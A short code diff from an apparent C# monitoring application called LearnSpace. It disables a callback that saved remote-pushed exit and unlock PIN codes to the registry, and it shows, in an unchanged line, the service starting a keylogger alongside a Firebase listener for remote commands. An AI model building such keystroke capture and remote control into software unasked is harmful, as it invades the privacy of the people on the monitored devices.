@@ -50,11 +50,7 @@ namespace LearnSpace.Services
             _firebaseService.ListenForCommands(_deviceToken, OnCommandReceived);
 
             // Lắng nghe cập nhật mã PIN động
-            _firebaseService.ListenToSecurityCodes(_deviceToken, codes =>
-            {
-                var registryService = new Core.Win32.RegistryService();
-                registryService.SaveSecurityCodes(codes.ExitCode, codes.UnlockCode);
-            });
+            _firebaseService.ListenToSecurityCodes(_deviceToken, null);
 
             // Bắt đầu Keylogger
             _keylogger.Start();
